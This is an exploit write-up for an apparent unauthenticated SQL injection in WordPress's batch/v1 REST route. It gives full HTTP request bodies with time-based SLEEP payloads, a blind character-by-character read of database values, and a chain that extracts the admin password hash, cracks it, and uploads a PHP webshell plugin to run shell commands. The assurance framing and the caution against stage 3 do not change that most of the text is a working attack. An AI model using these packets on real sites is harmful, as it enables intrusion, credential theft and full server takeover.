# Wire-level view — WordPress batch/v1 route-confusion → `author__not_in` SQLi

Affected: WP 6.9.0–6.9.4, 7.0.0–7.0.1. Patched: 6.9.5 / 7.0.2.
Entry point: `POST /?rest_route=/batch/v1/` (or `POST /wp-json/batch/v1/`).
Auth: **none** — anonymous.

The attacker sends ONE outer HTTP request. Everything else is JSON nested inside it.
Two desync layers are used:

  outer desync  : routes  `POST /wp/v2/posts (body = inner batch)`  →  the /batch/v1 handler
                  so the inner batch runs.
  inner desync  : routes  `GET /wp/v2/users?author_exclude=<INJ>`   →  posts get_items()
                  so `author_exclude` (unknown/unsanitised on the users route) lands in
                  `author__not_in` as a raw string → SQL injection.

The `"///"` sub-requests are the desync primers (they fail `wp_parse_url()`, become a
WP_Error, get pushed to $validation but NOT $matches → the off-by-one).

--------------------------------------------------------------------------------
PACKET 1 — detection / confirmation (time-based, non-destructive)
--------------------------------------------------------------------------------
Injected author__not_in value:   0) OR SLEEP(3)-- -
(baseline run uses SLEEP(0); the ~3s delta is the proof of server-side control)

POST /?rest_route=/batch/v1/ HTTP/1.1
Host: victim.example
User-Agent: Mozilla/5.0
Content-Type: application/json
Accept: application/json
Connection: close

{"validation":"normal","requests":[
  {"method":"POST","path":"///"},
  {"method":"POST","path":"/wp/v2/posts","body":{"validation":"normal","requests":[
      {"method":"POST","path":"///"},
      {"method":"GET","path":"/wp/v2/users?author_exclude=0%29%20OR%20SLEEP%283%29--%20-"},
      {"method":"GET","path":"/wp/v2/posts"}
  ]}},
  {"method":"POST","path":"/batch/v1","body":{"requests":[]}}
]}

  author_exclude decoded:  0) OR SLEEP(3)-- -
  Resulting WHERE fragment: ... AND wp_posts.post_author NOT IN (0) OR SLEEP(3)-- - ) ...

Response: HTTP/1.1 207 Multi-Status, a JSON {"responses":[...]} envelope.
Signal is TIMING, not body — vulnerable host answers ~3s slower than the SLEEP(0) run.

--------------------------------------------------------------------------------
PACKET 2 — blind read (boolean-via-time oracle), one bit per request
--------------------------------------------------------------------------------
Injected value pattern:   0) OR IF((<condition>),SLEEP(2),0)-- -
Example condition proving read access to the DB version banner, char 1 > 52 ('4'):

  author_exclude decoded:
  0) OR IF((ASCII(SUBSTRING(COALESCE((SELECT @@version),''),1,1))>52),SLEEP(2),0)-- -

Same outer/inner envelope as Packet 1, only the inner author_exclude value changes.
Binary-search each character position → reconstruct the value from response timing.
An assurance PoC should stop at a benign value (@@version, database(), table prefix).

--------------------------------------------------------------------------------
PACKET 3 — (attacker-only, NOT run for assurance) credential extraction
--------------------------------------------------------------------------------
The public tool swaps the expression for:
  SELECT CONCAT(user_login,0x3a,user_pass) FROM wp_users LIMIT 1
…extracts the phpass hash bit-by-bit, cracks it OFFLINE, then:

  POST /wp-login.php                      (normal auth with cracked password)
  GET  /wp-admin/plugin-install.php       (scrape upload nonce)
  POST /wp-admin/update.php?action=upload-plugin   (ZIP containing a PHP webshell)
  GET  /wp-content/plugins/<slug>/<slug>.php?t=<token>&c=<cmd>   (shell_exec)

This stage is authenticated plugin upload, not SQLi — the SQLi only yields the hash.
Do not run stage 3 in an assurance engagement; confirming Packets 1–2 proves impact.
